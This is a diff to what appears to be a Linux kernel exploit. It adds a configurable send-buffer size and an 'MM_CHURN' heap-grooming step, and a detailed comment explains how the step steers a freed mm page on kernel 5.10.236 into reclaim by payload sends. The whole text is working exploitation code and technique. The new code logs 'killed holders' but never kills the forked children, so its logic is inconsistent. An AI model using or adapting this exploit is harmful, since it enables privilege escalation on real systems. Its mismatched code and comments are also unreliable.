@@ -1431,7 +1431,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
-  int sndbuf = 1 << 20;
+  int sndbuf = env_int_range("SNDBUF_KB", 1024, 64, 16384) * 1024;
   setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (reclaim_flags >= 0) {
@@ -1481,6 +1481,21 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+
+  /*
+   * MM_CHURN: on 5.10.236 the emptied mm page lands on the SLUB per-cpu
+   * partial list (cpu_partial≈13 for 0x3c0 objects) and never reaches the
+   * buddy — the reclaim frags claim unrelated pages instead (QEMU-verified:
+   * 14 payload pages bracketing but skipping the leaked base). Choreography:
+   * (1) fork holder pairs NOW — their mm allocations drain the partial
+   *     lists so the chain is empty when the closes start;
+   * (2) the closes free base's page → it becomes the OLDEST chain entry;
+   * (3) killing the holder pairs afterwards adds one empty page per pair;
+   *     past cpu_partial the chain spills (unfreeze_partials) discarding
+   *     empty slabs oldest-LAST → base is the FRESHEST order-2 page on the
+   *     PCP freelist → reclaim send #1 claims it.
+   */
+
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
@@ -1502,6 +1517,25 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
+
+  int churn_count = env_int_range("MM_CHURN", 0, 0, 1024);
+  pid_t *churn_pids = NULL;
+  if (churn_count > 0) {
+    churn_pids = calloc((size_t)churn_count, sizeof(pid_t));
+    for (int i = 0; i < churn_count; i++) {
+      churn_pids[i] = clone_child();
+    }
+    pr_info("MM_CHURN forked %d holders (~%d pages)\n", churn_count,
+            churn_count / 16);
+  }
+  if (churn_pids) {
+    for (int i = 0; i < churn_count; i++) {
+      sched_yield();
+    }
+    free(churn_pids);
+    churn_pids = NULL;
+    pr_info("MM_CHURN killed holders (partial spill → base freshest)\n");
+  }
   /*
    * RECLAIM_DELAY_MS: mm_struct frees are RCU/mmdrop-deferred; if the
    * reclaim sends fire before the target page reaches the PCP freelist,
